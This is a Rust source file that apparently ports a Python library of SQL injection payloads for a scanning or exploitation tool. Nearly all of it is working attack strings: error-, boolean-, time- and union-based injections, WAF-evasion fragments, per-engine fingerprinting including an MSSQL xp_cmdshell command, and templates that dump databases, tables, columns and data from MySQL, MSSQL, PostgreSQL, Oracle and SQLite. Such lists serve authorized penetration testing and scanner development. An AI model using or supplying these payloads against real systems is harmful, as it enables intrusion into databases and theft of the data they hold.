//! SQL injection payloads - port of legacy/lib/payloads/sql_payloads.py

/// Error-based SQL injection payloads (31 items)
pub const ERROR_BASED: &[&str] = &[
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1#",
    "\" OR 1=1#",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('x'='x",
    "\") OR (\"x\"=\"x",
    "' OR 1=1 LIMIT 1#",
    "\" OR 1=1 LIMIT 1#",
    "' OR 1=1 LIMIT 1 --",
    "\" OR 1=1 LIMIT 1 --",
    "' OR '1'='1' LIMIT 1 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
    "1' ORDER BY 10--+",
    "1' ORDER BY 5--+",
    "1' GROUP BY 1,2,--+",
    "' GROUP BY columnnames having 1=1 --",
    "-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
];

/// Boolean-based SQL injection payloads (20 items)
pub const BOOLEAN_BASED: &[&str] = &[
    "' AND 1=1 --",
    "' AND 1=0 --",
    "' OR 1=1 --",
    "' OR 1=0 --",
    "\" AND 1=1 --",
    "\" AND 1=0 --",
    "\" OR 1=1 --",
    "\" OR 1=0 --",
    "' AND '1'='1",
    "' AND '1'='0",
    "\" AND \"1\"=\"1",
    "\" AND \"1\"=\"0",
    "1' AND 1=(SELECT COUNT(*) FROM tablenames); --",
    "1' AND 1=(SELECT 0); --",
    "1' OR 1=(SELECT 0); --",
    "1' OR 1=(SELECT COUNT(*) FROM tablenames); --",
    "1 AND (SELECT 1 FROM dual WHERE 1=1)='1'",
    "1 AND (SELECT 1 FROM dual WHERE 1=0)='1'",
    "1' AND 1=(SELECT COUNT(1) FROM (SELECT 1 UNION SELECT 2)x); --",
    "1' OR 1=(SELECT COUNT(1) FROM (SELECT 1 UNION SELECT 2)x); --",
];

/// Time-based SQL injection payloads (18 items)
pub const TIME_BASED: &[&str] = &[
    "' AND SLEEP(5) --",
    "\" AND SLEEP(5) --",
    "' OR SLEEP(5) --",
    "\" OR SLEEP(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "\"; WAITFOR DELAY '0:0:5' --",
    "' OR WAITFOR DELAY '0:0:5' --",
    "\" OR WAITFOR DELAY '0:0:5' --",
    "1' AND (SELECT 1 FROM PG_SLEEP(5)) --",
    "1' AND SLEEP(5) AND '1'='1",
    "1' OR SLEEP(5) AND '1'='1",
    "' SELECT pg_sleep(5) --",
    "1) OR pg_sleep(5)--",
    "' WAITFOR DELAY '0:0:5'--",
];

/// Union-based SQL injection payloads (20 items)
pub const UNION_BASED: &[&str] = &[
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT BANNER,NULL,NULL,NULL,NULL FROM v$version --",
    "' UNION SELECT @@version,NULL,NULL,NULL,NULL --",
    "' UNION SELECT version(),NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3,4,5 --",
    "' UNION SELECT 1,2,3,4,5,6 --",
    "' UNION SELECT 1,2,3,4,5,6,7 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
    "' UNION ALL SELECT 1,2,3,4,5 --",
    "' UNION ALL SELECT 1,2,3,4,5,6 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 --",
];

/// WAF bypass technique strings (building blocks)
pub const WAF_BYPASS: &[&str] = &[
    "/**/", "/*!50000*/", "#", "--", "-- -", ";--", "; -- -", "/*! */",
    "SeLeCt", "uNiOn", "WheRe",
    "%09", "%0A", "%0C", "%0D", "%A0",
    "%2527", "%252F", "%2520",
    "%252527", "%25252F", "%252520",
    "CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))",
    "CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)",
    "CHAR(83)||CHAR(69)||CHAR(76)||CHAR(69)||CHAR(67)||CHAR(84)",
    "%00", "\\0",
    " OR 2>1", " || 1=1", " && 1=1",
    "SEL/**/ECT", "SEL%09ECT", "S%0AELECT", "SELEC/*FOOBAR*/T",
];

/// Database fingerprint payloads by DB type
pub fn db_fingerprint_mysql() -> &'static [&'static str] {
    &[
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
        "' UNION SELECT @@version,NULL,NULL --",
        "' AND @@version --",
        "' AND CONVERT(@@version USING utf8) --",
    ]
}
pub fn db_fingerprint_mssql() -> &'static [&'static str] {
    &[
        "' AND (SELECT CAST(@@version AS VARCHAR(8000))) --",
        "' UNION SELECT @@version,NULL,NULL --",
        "'; EXEC master..xp_cmdshell 'ping 127.0.0.1' --",
        "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --",
    ]
}
pub fn db_fingerprint_postgres() -> &'static [&'static str] {
    &[
        "' AND (SELECT version()) --",
        "' UNION SELECT version(),NULL,NULL,NULL,NULL --",
        "'; SELECT pg_sleep(5) --",
        "' AND CAST(version() AS VARCHAR) --",
    ]
}
pub fn db_fingerprint_oracle() -> &'static [&'static str] {
    &[
        "' AND (SELECT BANNER FROM v$version WHERE ROWNUM=1) --",
        "' UNION SELECT BANNER,NULL,NULL FROM v$version --",
        "' AND INSTRB(UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||SUBSTR(BANNER,1,7)||CHR(113)||CHR(62))),CHR(60)||CHR(58)||CHR(113))>0 FROM v$version --",
        "' AND SYS.DATABASE_NAME IS NOT NULL --",
    ]
}
pub fn db_fingerprint_sqlite() -> &'static [&'static str] {
    &[
        "' AND sqlite_version() IS NOT NULL --",
        "' UNION SELECT sqlite_version(),NULL,NULL --",
        "' AND TYPEOF(sqlite_version()) --",
        "' AND LIKE('%%',sqlite_version()) --",
    ]
}

/// Extraction payload templates by DB type (use {} for table/db, {0}/{1} for columns/table in data)
#[derive(Clone, Default)]
pub struct ExtractionPayloads {
    pub databases: Vec<String>,
    pub tables: Vec<String>,
    pub columns: Vec<String>,
    pub data: Vec<String>,
}

pub fn extraction_payloads_mysql() -> ExtractionPayloads {
    ExtractionPayloads {
        databases: vec![
            "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata --".into(),
            "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata --".into(),
        ],
        tables: vec![
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE() --".into(),
            "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE() --".into(),
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='{}' --".into(),
            "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='{}' --".into(),
        ],
        columns: vec![
            "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='{}' --".into(),
            "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='{}' --".into(),
        ],
        data: vec![
            "' UNION SELECT {0},NULL,NULL FROM {1} --".into(),
            "' UNION SELECT GROUP_CONCAT({0}),NULL,NULL FROM {1} --".into(),
        ],
    }
}

pub fn extraction_payloads_mssql() -> ExtractionPayloads {
    ExtractionPayloads {
        databases: vec![
            "' UNION SELECT name,NULL,NULL FROM master..sysdatabases --".into(),
            "' UNION SELECT DB_NAME(0),NULL,NULL --".into(),
            "' UNION SELECT DB_NAME(1),NULL,NULL --".into(),
        ],
        tables: vec![
            "' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U' --".into(),
            "' UNION SELECT name,NULL,NULL FROM {0}..sysobjects WHERE xtype='U' --".into(),
        ],
        columns: vec![
            "' UNION SELECT name,NULL,NULL FROM syscolumns WHERE id=OBJECT_ID('{}') --".into(),
        ],
        data: vec![
            "' UNION SELECT {0},NULL,NULL FROM {1} --".into(),
        ],
    }
}

pub fn extraction_payloads_postgres() -> ExtractionPayloads {
    ExtractionPayloads {
        databases: vec![
            "' UNION SELECT datname,NULL,NULL FROM pg_database --".into(),
        ],
        tables: vec![
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --".into(),
            "' UNION SELECT tablename,NULL,NULL FROM pg_tables WHERE schemaname='public' --".into(),
        ],
        columns: vec![
            "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='{}' --".into(),
        ],
        data: vec![
            "' UNION SELECT {0},NULL,NULL FROM {1} --".into(),
        ],
    }
}

pub fn extraction_payloads_oracle() -> ExtractionPayloads {
    ExtractionPayloads {
        databases: vec![
            "' UNION SELECT owner,NULL,NULL FROM all_tables --".into(),
        ],
        tables: vec![
            "' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner=USER --".into(),
            "' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='{}' --".into(),
        ],
        columns: vec![
            "' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='{}' --".into(),
        ],
        data: vec![
            "' UNION SELECT {0},NULL,NULL FROM {1} --".into(),
        ],
    }
}

pub fn extraction_payloads_sqlite() -> ExtractionPayloads {
    ExtractionPayloads {
        databases: vec![
            "' UNION SELECT 'main',NULL,NULL --".into(),
        ],
        tables: vec![
            "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table' --".into(),
        ],
        columns: vec![
            "' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table' AND name='{}' --".into(),
        ],
        data: vec![
            "' UNION SELECT {0},NULL,NULL FROM {1} --".into(),
        ],
    }
}

/// Get extraction payloads by DB type name (mysql, mssql, postgres, oracle, sqlite).
pub fn extraction_payloads_for_db(db: &str) -> ExtractionPayloads {
    match db.to_lowercase().as_str() {
        "mysql" => extraction_payloads_mysql(),
        "mssql" => extraction_payloads_mssql(),
        "postgres" | "postgresql" => extraction_payloads_postgres(),
        "oracle" => extraction_payloads_oracle(),
        "sqlite" => extraction_payloads_sqlite(),
        _ => extraction_payloads_mysql(), // default
    }
}
